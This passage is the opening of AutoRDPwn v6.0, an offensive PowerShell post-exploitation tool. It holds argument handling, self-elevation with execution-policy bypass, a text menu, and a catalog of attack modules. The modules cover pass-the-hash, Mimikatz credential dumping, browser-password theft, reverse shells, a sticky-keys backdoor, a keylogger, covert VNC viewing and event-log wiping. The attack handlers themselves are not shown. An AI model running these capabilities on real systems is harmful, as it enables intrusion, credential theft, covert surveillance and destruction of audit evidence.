
param(
    [switch]$noadmin,
    [switch]$nogui,
    [string]$lang = '',
    [string]$option = '',
    [string]$shadow = '',
    [switch]$createuser,
    [switch]$noclean
)

$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
Set-StrictMode -Off
try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch { }

$script:ARVersion = '6.0'
$script:ARIsWindows = ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)
$script:ARNoAdmin = [bool]$noadmin
$script:ARNoGui = [bool]$nogui
$script:ARNoClean = [bool]$noclean
$script:ARCreateUser = [bool]$createuser
$script:ARLanguageArgument = [string]$lang
$script:ARShadowPreference = ([string]$shadow).Trim().ToLowerInvariant()
$script:ARInvokedFromOption = -not [string]::IsNullOrWhiteSpace($option)
$script:AROptionValue = ([string]$option).Trim()

# Bound-but-empty -option and stray positional/unknown tokens used to fall through to
# interactive mode or into $args; both are argument errors and must fail loudly.
if ($PSBoundParameters.ContainsKey('option') -and [string]::IsNullOrWhiteSpace($option)) {
    Write-Host '[!] -option requires a value, for example: -option 8' -ForegroundColor Red
    exit 1
}
if ($args.Count -gt 0) {
    Write-Host ('[!] Unknown argument: ' + ($args -join ' ')) -ForegroundColor Red
    exit 1
}
$script:AROriginalLocation = (Get-Location).Path

$script:ARLocal = $false
$script:ARRoot = ''
$candidates = New-Object System.Collections.Generic.List[string]
if ($PSScriptRoot) { $candidates.Add($PSScriptRoot) }
if ($MyInvocation.MyCommand.Path) { $candidates.Add((Split-Path -Parent $MyInvocation.MyCommand.Path)) }
$candidates.Add((Get-Location).Path)
foreach ($candidate in $candidates) {
    if ([string]::IsNullOrWhiteSpace($candidate)) { continue }
    if (Test-Path -LiteralPath (Join-Path $candidate 'Resources\Scripts')) {
        $script:ARRoot = $candidate
        $script:ARLocal = $true
        break
    }
}
if (-not $script:ARLocal) {
    $script:ARRoot = Join-Path $env:TEMP 'AutoRDPwn'
}
$script:ARResources = Join-Path $script:ARRoot 'Resources'
$script:ARTools = Join-Path $script:ARResources 'Tools'
foreach ($directory in @($script:ARRoot, $script:ARResources, $script:ARTools)) {
    if (-not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
}
$script:ARRepository = 'https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master'

try {
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
} catch { }
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
} catch { }

function Test-ARHeaderAdmin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

if ($script:ARIsWindows -and -not $script:ARNoAdmin -and -not (Test-ARHeaderAdmin)) {
    $launcher = ''
    if ($PSCommandPath) { $launcher = $PSCommandPath }
    elseif ($MyInvocation.MyCommand.Path) { $launcher = $MyInvocation.MyCommand.Path }
    if ([string]::IsNullOrWhiteSpace($launcher)) {
        Write-Host '[!] Administrator privileges are required.' -ForegroundColor Red
        exit 1
    }
    $forward = New-Object System.Collections.Generic.List[string]
    if ($script:ARNoGui) { $forward.Add('-nogui') }
    if (-not [string]::IsNullOrWhiteSpace($script:ARLanguageArgument)) { $forward.Add('-lang'); $forward.Add($script:ARLanguageArgument) }
    if (-not [string]::IsNullOrWhiteSpace($script:AROptionValue)) { $forward.Add('-option'); $forward.Add($script:AROptionValue) }
    if (-not [string]::IsNullOrWhiteSpace($script:ARShadowPreference)) { $forward.Add('-shadow'); $forward.Add($script:ARShadowPreference) }
    if ($script:ARCreateUser) { $forward.Add('-createuser') }
    if ($script:ARNoClean) { $forward.Add('-noclean') }
    $argumentList = @('-sta', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', ('"' + $launcher + '"'))
    foreach ($argument in $forward) { $argumentList += $argument }
    Write-Host '[i] Requesting administrator privileges...' -ForegroundColor Green
    try {
        $startArgs = @{
            FilePath = 'powershell.exe'
            Verb = 'RunAs'
            ArgumentList = $argumentList
            ErrorAction = 'Stop'
        }
        if ($script:ARLocal) { $startArgs['WorkingDirectory'] = $script:ARRoot }
        Start-Process @startArgs | Out-Null
    } catch {
        Write-Host '[!] Elevation cancelled. Run this terminal as Administrator, or launch with -noadmin.' -ForegroundColor Red
        Start-Sleep -Seconds 3
        exit 1
    }
    exit
}

try {
    $Host.UI.RawUI.WindowTitle = 'AutoRDPwn - v6.0 - by jeko'
    $Host.UI.RawUI.BackgroundColor = 'Black'
    $Host.UI.RawUI.ForegroundColor = 'Gray'
} catch { }

$script:ARLocaleName = 'English'
$script:ARStrings = @{}
$script:ARFallbackStrings = @{}
$script:ARTarget = @{
    Computer   = 'localhost'
    User       = ''
    Password   = ''
    Hash       = ''
    Domain     = ''
    AttackerIP = ''
    Mode       = 'control'
}
$script:ARStatus = @{ Text = 'Ready'; Kind = 'Info' }
$script:ARScroll = 0
$script:ARSelectedId = ''
$script:ARFilter = ''
$script:ARSessionState = 'not connected'
$script:ARTestMode = $false
$script:ARNoClear = $false
$script:ARTestWidth = 0
$script:ARTestHeight = 0
$script:ARTestBuffer = New-Object System.Collections.Generic.List[string]
$script:ARActionCatalogCache = $null
$script:ARTargetProfilesPath = ''
$script:ARTuiFrameActive = $false
$script:ARTuiFrameScreen = ''
$script:ARTuiFrameWidth = 0
$script:ARTuiFrameHeight = 0
$script:ARTuiFrameLine = 0
$script:ARAdminState = $null
$script:ARTuiLevel = ''
$script:ARSelectedCategoryKey = 'quick'
$script:ARCategoryScroll = 0
$script:ARPendingKey = $null
$script:ARTuiPromptRow = 0
$script:ARLineCategoryKey = ''
$script:ARLegacyMap = @{
    '11' = '101'
    '12' = '201'
    '13' = '301'
    '14' = '401'
    '15' = '501'
    '16' = '601'
    '17' = '701'
}

function Import-ARLanguage {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [switch]$AsFallback
    )
    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Language file not found: $Path"
    }
    $captured = & {
        . $Path
        Get-Variable -Name 'txt*', 'Pwn*' -ErrorAction SilentlyContinue
    }
    $strings = @{}
    foreach ($item in $captured) {
        if ($null -ne $item -and $item.Name) {
            $strings[$item.Name] = [string]$item.Value
        }
    }
    if ($AsFallback) {
        $script:ARFallbackStrings = $strings
    }
    else {
        $script:ARStrings = $strings
    }
}

function Get-ARText {
    param(
        [Parameter(Mandatory = $true)][string]$Key,
        [string]$Default = ''
    )
    if ($script:ARStrings.ContainsKey($Key)) {
        return $script:ARStrings[$Key]
    }
    if ($script:ARFallbackStrings.ContainsKey($Key)) {
        return $script:ARFallbackStrings[$Key]
    }
    return $Default
}

function Set-ARLanguageName {
    param([Parameter(Mandatory = $true)][string]$Name)
    $script:ARLocaleName = $Name
}

function Set-ARStatus {
    param(
        [Parameter(Mandatory = $true)][string]$Text,
        [ValidateSet('Info', 'Ok', 'Warn', 'Error')][string]$Kind = 'Info'
    )
    $script:ARStatus = @{ Text = $Text; Kind = $Kind }
}

function Set-ARSessionState {
    param([string]$State)
    if ($null -eq $State -or $State -eq '') {
        $script:ARSessionState = 'not connected'
    }
    else {
        $script:ARSessionState = $State
    }
}

function Format-ARText {
    param(
        [AllowNull()][string]$Text,
        [int]$MaxWidth
    )
    if ($MaxWidth -lt 1) { return '' }
    if ($null -eq $Text) { return '' }
    $flat = ($Text -replace '[\r\n\t]+', ' ').Trim()
    if ($flat.Length -le $MaxWidth) { return $flat }
    if ($MaxWidth -le 3) { return $flat.Substring(0, $MaxWidth) }
    return $flat.Substring(0, $MaxWidth - 3) + '...'
}

function Get-ARWrappedLines {
    param(
        [AllowNull()][string]$Text,
        [int]$Width,
        [int]$MaxLines
    )
    $result = New-Object System.Collections.Generic.List[string]
    if ($Width -lt 4 -or $MaxLines -lt 1) { return @() }
    if ($null -eq $Text) { return @() }
    $flat = ($Text -replace '\s+', ' ').Trim()
    if ($flat -eq '') { return @() }
    $words = $flat -split ' '
    $line = ''
    $truncated = $false
    foreach ($word in $words) {
        if ($word.Length -gt $Width) {
            if ($line -ne '') {
                $result.Add($line)
                $line = ''
                if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            }
            $result.Add($word.Substring(0, $Width))
            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            continue
        }
        if ($line -eq '') {
            $candidate = $word
        }
        else {
            $candidate = $line + ' ' + $word
        }
        if ($candidate.Length -le $Width) {
            $line = $candidate
        }
        else {
            $result.Add($line)
            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            $line = $word
        }
    }
    if ($result.Count -lt $MaxLines -and $line -ne '') {
        $result.Add($line)
    }
    elseif ($line -ne '') {
        $truncated = $true
    }
    if ($truncated -and $result.Count -gt 0) {
        $last = $result[$result.Count - 1]
        if ($last.Length -gt ($Width - 3)) {
            $last = $last.Substring(0, $Width - 3)
        }
        $result[$result.Count - 1] = $last + '...'
    }
    return $result.ToArray()
}

function Get-ARConsoleWidth {
    if ($script:ARTestMode -and $script:ARTestWidth -gt 0) { return $script:ARTestWidth }
    $width = 100
    try {
        if ([Console]::WindowWidth -gt 0) { $width = [Console]::WindowWidth }
    }
    catch { }
    if ($width -lt 60) { $width = 60 }
    return $width
}

function Get-ARConsoleHeight {
    if ($script:ARTestMode -and $script:ARTestHeight -gt 0) { return $script:ARTestHeight }
    $height = 30
    try {
        if ([Console]::WindowHeight -gt 0) { $height = [Console]::WindowHeight }
    }
    catch { }
    if ($height -lt 20) { $height = 20 }
    return $height
}

function Clear-ARScreen {
    if ($script:ARTestMode) { return }
    if ($script:ARNoClear) { return }
    Clear-Host
}

function Start-ARTuiFrame {
    param([string]$Screen = 'main')
    if ($script:ARTestMode) { return }
    try {
        $width = Get-ARConsoleWidth
        $height = Get-ARConsoleHeight
        $needsClear = (-not $script:ARTuiFrameActive) -or
            ($Screen -ne $script:ARTuiFrameScreen) -or
            ($width -ne $script:ARTuiFrameWidth) -or
            ($height -ne $script:ARTuiFrameHeight)
        if ($needsClear) {
            if (-not $script:ARNoClear) { Clear-Host }
            $script:ARTuiFrameActive = $true
            $script:ARTuiFrameScreen = $Screen
            $script:ARTuiFrameWidth = $width
            $script:ARTuiFrameHeight = $height
        }
        try { [Console]::CursorVisible = $false } catch { }
        try {
            [Console]::SetCursorPosition(0, 0)
            $script:ARTuiFrameLine = 0
        }
        catch {
            Clear-ARScreen
            $script:ARTuiFrameActive = $false
        }
    }
    catch {
        Clear-ARScreen
        $script:ARTuiFrameActive = $false
    }
}

function Stop-ARTuiFrame {
    if ($script:ARTestMode) { return }
    try {
        $row = [Math]::Min((Get-ARConsoleHeight) - 1, [Math]::Max(0, $script:ARTuiFrameLine))
        [Console]::SetCursorPosition(0, $row)
    }
    catch { }
    try { [Console]::CursorVisible = $true } catch { }
    $script:ARTuiFrameActive = $false
    $script:ARTuiFrameScreen = ''
}

function Write-ARLine {
    param(
        [AllowEmptyString()][string]$Text = '',
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    if ($script:ARTestMode) {
        $script:ARTestBuffer.Add($Text)
        return
    }
    if ($script:ARTuiFrameActive) {
        $width = $script:ARTuiFrameWidth - 1
        if ($width -gt 0 -and $Text.Length -lt $width) {
            $Text = $Text.PadRight($width)
        }
        $script:ARTuiFrameLine++
    }
    if ($Background -ne '') {
        Write-Host $Text -ForegroundColor $Color -BackgroundColor $Background
    }
    else {
        Write-Host $Text -ForegroundColor $Color
    }
}

function Test-ARIsAdmin {
    if ($null -ne $script:ARAdminState) { return $script:ARAdminState }
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $script:ARAdminState = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch {
        $script:ARAdminState = $false
    }
    return $script:ARAdminState
}

function New-ARAction {
    param(
        [Parameter(Mandatory = $true)][string]$Id,
        [Parameter(Mandatory = $true)][string]$Title,
        [Parameter(Mandatory = $true)][string]$Description,
        [Parameter(Mandatory = $true)][string]$Handler,
        [bool]$NeedsTarget = $true,
        [bool]$NeedsSession = $true
    )
    return [pscustomobject]@{
        Kind         = 'Action'
        Id           = $Id
        Title        = $Title
        Description  = $Description
        Handler      = $Handler
        NeedsTarget  = $NeedsTarget
        NeedsSession = $NeedsSession
    }
}

function New-ARGroup {
    param(
        [Parameter(Mandatory = $true)][string]$Title,
        [string]$Description = ''
    )
    return [pscustomobject]@{
        Kind        = 'Group'
        Title       = $Title
        Description = $Description
    }
}

function Reset-ARActionCatalogCache {
    $script:ARActionCatalogCache = $null
}

function Get-ARActionCatalog {
    if ($null -ne $script:ARActionCatalogCache) { return $script:ARActionCatalogCache }
    $items = New-Object System.Collections.Generic.List[object]

    $items.Add((New-ARAction -Id '1' -Title (Get-ARText 'txt155' 'PSexec (SMB)') -Description 'Copy and start the payload with PSexec over SMB, then open the shadow session.' -Handler 'Invoke-ARAttackPSexec' -NeedsSession $false))
    $items.Add((New-ARAction -Id '2' -Title (Get-ARText 'txt156' 'Pass the Hash (SMB)') -Description 'Authenticate with an NTLM hash through SMBExec and start the payload.' -Handler 'Invoke-ARAttackPassTheHash' -NeedsSession $false))
    $items.Add((New-ARAction -Id '3' -Title (Get-ARText 'txt157' 'Windows Management Instrumentation (WMI)') -Description 'Create the remote process through CIM/WMI with optional credentials.' -Handler 'Invoke-ARAttackWmi' -NeedsSession $false))
    $items.Add((New-ARAction -Id '4' -Title (Get-ARText 'txt158' 'Windows Remote Management (WinRM)') -Description 'Run the payload through a WinRM session with optional credentials.' -Handler 'Invoke-ARAttackWinRm' -NeedsSession $false))
    $items.Add((New-ARAction -Id '5' -Title (Get-ARText 'txt159' 'Windows Remote Assistance (WinRS)') -Description 'Run the payload with WinRS and then open the shadow session.' -Handler 'Invoke-ARAttackWinRs' -NeedsSession $false))
    $items.Add((New-ARAction -Id '6' -Title (Get-ARText 'txt160' 'Local Session Hijacking (TSCon)') -Description 'Attach the current console to another local session with tscon.' -Handler 'Invoke-ARAttackTscon' -NeedsTarget $false -NeedsSession $false))
    $items.Add((New-ARAction -Id '7' -Title (Get-ARText 'txt161' 'Remote Desktop Execution (RDP)') -Description 'Start the payload through SharpRDP and then open the shadow session.' -Handler 'Invoke-ARAttackRdp' -NeedsSession $false))
    $items.Add((New-ARAction -Id '8' -Title (Get-ARText 'txt121' 'Quick Screen (Stealth VNC)') -Description (Get-ARText 'txt122' 'Watch or control the target screen without the user noticing') -Handler 'Invoke-ARAttackQuickScreen'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt17' 'Remote Access') -Description (Get-ARText 'txt139' 'Shells, consoles and reverse connections that stay open')))
    $items.Add((New-ARAction -Id '101' -Title 'Named Pipe Remote Shell (SMB)' -Description (Get-ARText 'txt95' 'Remote shell through a named pipe over SMB port 445') -Handler 'Invoke-ARModulePipeShell'))
    $items.Add((New-ARAction -Id '102' -Title (Get-ARText 'txt39' 'Semi-interactive console (WinRS)') -Description (Get-ARText 'txt96' 'Remote console over WinRM port 5985 using direct PowerShell') -Handler 'Invoke-ARModuleWinRsConsole'))
    $items.Add((New-ARAction -Id '103' -Title 'PowerShell HTTP-RevShell (HTTP/S)' -Description (Get-ARText 'txt97' 'Reverse shell that dials back over HTTP/S, crosses proxies') -Handler 'Invoke-ARModuleHttpRevShell'))
    $items.Add((New-ARAction -Id '104' -Title (Get-ARText 'txt51' 'Netcat console (direct connection)') -Description (Get-ARText 'txt99' 'The target listens and you connect to it') -Handler 'Invoke-ARModuleNetcatDirect'))
    $items.Add((New-ARAction -Id '105' -Title (Get-ARText 'txt52' 'Netcat console (reverse connection)') -Description (Get-ARText 'txt98' 'You listen and the target connects back to you') -Handler 'Invoke-ARModuleNetcatReverse'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt50' 'Passwords and hashes') -Description (Get-ARText 'txt140' 'Dump credentials, browser secrets and saved Wi-Fi keys')))
    $items.Add((New-ARAction -Id '201' -Title (Get-ARText 'txt9' 'Extract local hashes with Mimikatz') -Description (Get-ARText 'txt100' 'Dump local account password hashes from the SAM registry hive') -Handler 'Invoke-ARModuleMimikatzSam'))
    $items.Add((New-ARAction -Id '202' -Title (Get-ARText 'txt10' 'Extract system passwords with Mimikatz') -Description (Get-ARText 'txt101' 'Extract plaintext passwords from the memory of authenticated processes') -Handler 'Invoke-ARModuleMimikatzLogon'))
    $items.Add((New-ARAction -Id '203' -Title (Get-ARText 'txt49' 'Obtain browsers passwords with SharpWeb') -Description (Get-ARText 'txt102' 'Recover passwords saved in Chrome, Firefox and other browsers') -Handler 'Invoke-ARModuleSharpWeb'))
    $items.Add((New-ARAction -Id '204' -Title (Get-ARText 'txt59' 'Recover Wi-Fi passwords') -Description (Get-ARText 'txt103' 'Show the keys of saved WiFi networks in clear text') -Handler 'Invoke-ARModuleWifiKeys'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt125' 'Networking / Pivoting') -Description (Get-ARText 'txt141' 'Scan, forward ports, serve files and spray credentials')))
    $items.Add((New-ARAction -Id '301' -Title 'TCP Port Scan' -Description (Get-ARText 'txt104' 'Multi-threaded TCP port scan of the target') -Handler 'Invoke-ARModulePortScan' -NeedsSession $false))
    $items.Add((New-ARAction -Id '302' -Title 'Native Port Forwarding' -Description (Get-ARText 'txt105' 'Forward ports with netsh, inbound locally or remote pivoting') -Handler 'Invoke-ARModulePortForward'))
    $items.Add((New-ARAction -Id '303' -Title 'PowerShell Web Server' -Description (Get-ARText 'txt106' 'Serve files from the target with a PowerShell web server') -Handler 'Invoke-ARModuleWebServer'))
    $items.Add((New-ARAction -Id '304' -Title 'Network Creds Scanner' -Description (Get-ARText 'txt107' 'Test a password or NTLM hash against a CIDR range via SMB/WMI') -Handler 'Invoke-ARModuleCredScan' -NeedsSession $false))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt126' 'Remote Desktop Forensics') -Description (Get-ARText 'txt142' 'Recover session history and enumerate local accounts')))
    $items.Add((New-ARAction -Id '401' -Title (Get-ARText 'txt11' 'Rebuild the image cache') -Description (Get-ARText 'txt129' 'Recover the RDP session history cached on this computer') -Handler 'Invoke-ARModuleRdpCaching' -NeedsTarget $false -NeedsSession $false))
    $items.Add((New-ARAction -Id '402' -Title (Get-ARText 'txt127' 'List local users and groups') -Description (Get-ARText 'txt109' 'List every user with SID, groups and last logon details') -Handler 'Invoke-ARModuleListUsers'))
    $items.Add((New-ARAction -Id '403' -Title (Get-ARText 'txt128' 'Extract session credentials (SessionGopher)') -Description (Get-ARText 'txt110' 'Extract credentials stored by PuTTY, SuperPuTTY, FileZilla and WinSCP') -Handler 'Invoke-ARModuleSessionGopher'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt64' 'Backdoors and persistence') -Description (Get-ARText 'txt143' 'Sticky keys, Metasploit and a remote keylogger')))
    $items.Add((New-ARAction -Id '501' -Title 'Sticky Keys Hacking' -Description (Get-ARText 'txt111' 'Replace sethc.exe so a SYSTEM console opens from the login screen') -Handler 'Invoke-ARModuleStickyKeys'))
    $items.Add((New-ARAction -Id '502' -Title 'Metasploit Reverse Shell' -Description (Get-ARText 'txt112' 'Deploy a persistent Metasploit reverse shell on the target') -Handler 'Invoke-ARModuleMetasploit'))
    $items.Add((New-ARAction -Id '503' -Title 'Remote Keylogger' -Description (Get-ARText 'txt113' 'Log every keystroke typed on the target console') -Handler 'Invoke-ARModuleKeylogger'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt68' 'Privilege escalation') -Description (Get-ARText 'txt144' 'Enumerate services, patches and paths to SYSTEM')))
    $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
    $items.Add((New-ARAction -Id '602' -Title (Get-ARText 'txt71' 'Search vulnerabilities with Sherlock') -Description (Get-ARText 'txt115' 'Scan the system for known kernel and service vulnerabilities') -Handler 'Invoke-ARModuleSherlock'))
    $items.Add((New-ARAction -Id '603' -Title (Get-ARText 'txt130' 'Privilege escalation audit') -Description (Get-ARText 'txt116' 'Audit services, tasks, permissions and patches for escalation paths') -Handler 'Invoke-ARModulePrivescCheck'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt69' 'Other modules') -Description (Get-ARText 'txt145' 'Logs, VNC, external scripts and user switching')))
    $items.Add((New-ARAction -Id '701' -Title (Get-ARText 'txt18' 'Deactivate system logs') -Description (Get-ARText 'txt117' 'Wipe event logs without stopping the EventLog service') -Handler 'Invoke-ARModulePhant0m'))
    $items.Add((New-ARAction -Id '702' -Title (Get-ARText 'txt62' 'Remote VNC Server (legacy)') -Description (Get-ARText 'txt118' 'Open an invisible VNC to watch and control the target screen') -Handler 'Invoke-ARModuleVncServer'))
    $items.Add((New-ARAction -Id '703' -Title (Get-ARText 'txt67' 'External script execution') -Description (Get-ARText 'txt119' 'Run any external PowerShell script or function on the target') -Handler 'Invoke-ARModuleExternalScript'))
    $items.Add((New-ARAction -Id '704' -Title (Get-ARText 'txt79' 'Change user with RunAs') -Description (Get-ARText 'txt120' 'Validate credentials and launch processes as another user') -Handler 'Invoke-ARModuleRunAs' -NeedsTarget $false -NeedsSession $false))

    $script:ARActionCatalogCache = $items.ToArray()
    return $script:ARActionCatalogCache
}

function Get-ARActionById {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $null }
    foreach ($item in Get-ARActionCatalog) {
        if ($item.Kind -eq 'Action' -and $item.Id -eq $Id) {
            return $item
        }
    }
    return $null
}

function Get-ARFilteredCatalog {
    param([string]$Filter = '')
    $catalog = @(Get-ARActionCatalog)
    if ($null -eq $Filter -or $Filter.Trim() -eq '') {
        return $catalog
    }
    $needle = $Filter.Trim().ToLowerInvariant()
    $result = New-Object System.Collections.Generic.List[object]
    $pendingGroup = $null
    $groupAdded = $false
    foreach ($item in $catalog) {
        if ($item.Kind -eq 'Group') {
            $pendingGroup = $item
            $groupAdded = $false
            continue
        }
        $haystack = ($item.Id + ' ' + $item.Title + ' ' + $item.Description).ToLowerInvariant()
        if ($haystack.Contains($needle)) {
            if ($pendingGroup -and -not $groupAdded) {
                $result.Add($pendingGroup)
                $groupAdded = $true
            }
            $result.Add($item)
        }
    }
    return $result.ToArray()
}

function Get-ARActionCategories {
    $catalog = @(Get-ARActionCatalog)
    $buckets = New-Object System.Collections.Generic.List[object]
    $current = @{
        Key         = 'quick'
        Title       = (Get-ARText 'txt137' 'Quick actions')
        Description = (Get-ARText 'txt138' 'One-shot remote execution and live screen control')
        Actions     = (New-Object System.Collections.Generic.List[object])
    }
    $buckets.Add($current)
    foreach ($item in $catalog) {
        if ($item.Kind -eq 'Group') {
            $description = ''
            if ($item.PSObject.Properties['Description']) { $description = [string]$item.Description }
            $current = @{
                Key         = 'pending'
                Title       = [string]$item.Title
                Description = $description
                Actions     = (New-Object System.Collections.Generic.List[object])
            }
            $buckets.Add($current)
            continue
        }
        $current['Actions'].Add($item)
    }
    $categories = New-Object System.Collections.Generic.List[object]
    foreach ($bucket in $buckets) {
        $actions = @($bucket['Actions'].ToArray())
        if ($actions.Count -eq 0) { continue }
        $key = [string]$bucket['Key']
        if ($key -eq 'pending') { $key = 'group-' + [string]$actions[0].Id }
        $description = [string]$bucket['Description']
        if ([string]::IsNullOrWhiteSpace($description)) {
            $description = (Format-ARItemCount -Count $actions.Count -Plural (Get-ARText 'txt146' 'actions'))
        }
        $categories.Add([pscustomobject]@{
            Kind        = 'Category'
            Key         = $key
            Title       = [string]$bucket['Title']
            Description = $description
            Actions     = $actions
        })
    }
    return $categories.ToArray()
}

function Get-ARCategoryByKey {
    param([string]$Key = '')
    if ([string]::IsNullOrWhiteSpace($Key)) { return $null }
    foreach ($category in @(Get-ARActionCategories)) {
        if ($category.Key -eq $Key) { return $category }
    }
    return $null
}

function Get-ARCategoryForAction {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $null }
    foreach ($category in @(Get-ARActionCategories)) {
        foreach ($action in $category.Actions) {
            if ($action.Id -eq $Id) { return $category }
        }
    }
    return $null
}

function Get-ARCategoryListForDisplay {
    $categories = @(Get-ARActionCategories)
    if ($script:ARTuiLevel -ne 'categories') { return $categories }
    if ([string]::IsNullOrWhiteSpace($script:ARFilter)) { return $categories }
    $needle = $script:ARFilter.Trim().ToLowerInvariant()
    $result = New-Object System.Collections.Generic.List[object]
    foreach ($category in $categories) {
        $haystack = ([string]$category.Title + ' ' + [string]$category.Description).ToLowerInvariant()
        if ($haystack.Contains($needle)) { $result.Add($category); continue }
        # A category survives the filter when one of its actions matches, so a
        # search for a module name still leads to the category that holds it.
        foreach ($action in $category.Actions) {
            $entry = ([string]$action.Id + ' ' + [string]$action.Title + ' ' + [string]$action.Description).ToLowerInvariant()
            if ($entry.Contains($needle)) { $result.Add($category); break }
        }
    }
    return $result.ToArray()
}

function Get-ARCurrentCategory {
    $categories = @(Get-ARCategoryListForDisplay)
    if ($categories.Count -eq 0) { return $null }
    foreach ($category in $categories) {
        if ($category.Key -eq $script:ARSelectedCategoryKey) { return $category }
    }
    return $categories[0]
}

function Get-ARCategoryActionList {
    param($Category, [string]$Filter = '')
    if ($null -eq $Category) { return @() }
    $actions = @($Category.Actions)
    if ([string]::IsNullOrWhiteSpace($Filter)) { return $actions }
    $needle = $Filter.Trim().ToLowerInvariant()
    $result = New-Object System.Collections.Generic.List[object]
    foreach ($action in $actions) {
        $haystack = ([string]$action.Id + ' ' + [string]$action.Title + ' ' + [string]$action.Description).ToLowerInvariant()
        if ($haystack.Contains($needle)) { $result.Add($action) }
    }
    return $result.ToArray()
}

function Get-ARCurrentActions {
    $category = Get-ARCurrentCategory
    return @(Get-ARCategoryActionList -Category $category -Filter $script:ARFilter)
}

function Get-ARCurrentAction {
    $actions = @(Get-ARCurrentActions)
    if ($actions.Count -eq 0) { return $null }
    foreach ($action in $actions) {
        if ($action.Id -eq $script:ARSelectedId) { return $action }
    }
    return $actions[0]
}

function Get-ARTuiListHeight {
    $height = Get-ARConsoleHeight
    return [Math]::Max(3, $height - 15)
}

function Initialize-ARTuiState {
    $categories = @(Get-ARActionCategories)
    if ($categories.Count -eq 0) {
        $script:ARTuiLevel = 'categories'
        return
    }
    if (-not [string]::IsNullOrWhiteSpace($script:ARSelectedId)) {
        $owner = Get-ARCategoryForAction $script:ARSelectedId
        if ($null -ne $owner) {
            $script:ARSelectedCategoryKey = $owner.Key
            if ($script:ARTuiLevel -ne 'categories' -and $script:ARTuiLevel -ne 'actions') {
                $script:ARTuiLevel = 'actions'
            }
            return
        }
    }
    if ($script:ARTuiLevel -ne 'actions') { $script:ARTuiLevel = 'categories' }
    $category = Get-ARCategoryByKey $script:ARSelectedCategoryKey
    if ($null -eq $category) {
        $category = $categories[0]
        $script:ARSelectedCategoryKey = $category.Key
    }
    if ([string]::IsNullOrWhiteSpace($script:ARSelectedId) -and $category.Actions.Count -gt 0) {
        $script:ARSelectedId = [string]$category.Actions[0].Id
    }
}

function Set-ARTuiCategory {
    param($Category)
    if ($null -eq $Category) { return }
    $script:ARSelectedCategoryKey = $Category.Key
    $script:ARCategoryScroll = 0
    if ($Category.Actions.Count -gt 0) {
        $script:ARSelectedId = [string]$Category.Actions[0].Id
    }
}

function Enter-ARTuiCategory {
    param([string]$Key = '')
    $category = Get-ARCategoryByKey $Key
    if ($null -eq $category) { return }
    $script:ARSelectedCategoryKey = $category.Key
    $script:ARTuiLevel = 'actions'
    $script:ARFilter = ''
    $script:ARScroll = 0
    $inside = $false
    foreach ($action in $category.Actions) {
        if ($action.Id -eq $script:ARSelectedId) { $inside = $true; break }
    }
    if (-not $inside -and $category.Actions.Count -gt 0) {
        $script:ARSelectedId = [string]$category.Actions[0].Id
    }
    Set-ARStatus ((Get-ARText 'txt151' 'Category') + ': ' + $category.Title) 'Info'
}

function Exit-ARTuiCategory {
    $script:ARTuiLevel = 'categories'
    $script:ARFilter = ''
    $category = Get-ARCurrentCategory
    if ($null -ne $category) {
        $script:ARSelectedCategoryKey = $category.Key
    }
    Set-ARStatus (Get-ARText 'txt149' 'Top level - choose a category') 'Info'
}

function Move-ARTuiSelection {
    param(
        [int]$Delta = 0,
        [switch]$Page
    )
    if ($script:ARTuiLevel -eq 'actions') {
        $actions = @(Get-ARCurrentActions)
        if ($actions.Count -eq 0) { return }
        $current = Get-ARCurrentAction
        $index = 0
        for ($i = 0; $i -lt $actions.Count; $i++) {
            if ($actions[$i].Id -eq $current.Id) { $index = $i; break }
        }
        if ($Page) {
            $step = [Math]::Max(3, (Get-ARTuiListHeight) - 1)
            $index = $index + ($Delta * $step)
            if ($index -lt 0) { $index = 0 }
            if ($index -ge $actions.Count) { $index = $actions.Count - 1 }
        }
        else {
            $index = $index + $Delta
            if ($index -lt 0) { $index = $actions.Count - 1 }
            if ($index -ge $actions.Count) { $index = 0 }
        }
        $script:ARSelectedId = [string]$actions[$index].Id
        return
    }
    $categories = @(Get-ARCategoryListForDisplay)
    if ($categories.Count -eq 0) { return }
    $current = Get-ARCurrentCategory
    $index = 0
    for ($i = 0; $i -lt $categories.Count; $i++) {
        if ($null -ne $current -and $categories[$i].Key -eq $current.Key) { $index = $i; break }
    }
    if ($Page) {
        $step = [Math]::Max(3, (Get-ARTuiListHeight) - 1)
        $index = $index + ($Delta * $step)
        if ($index -lt 0) { $index = 0 }
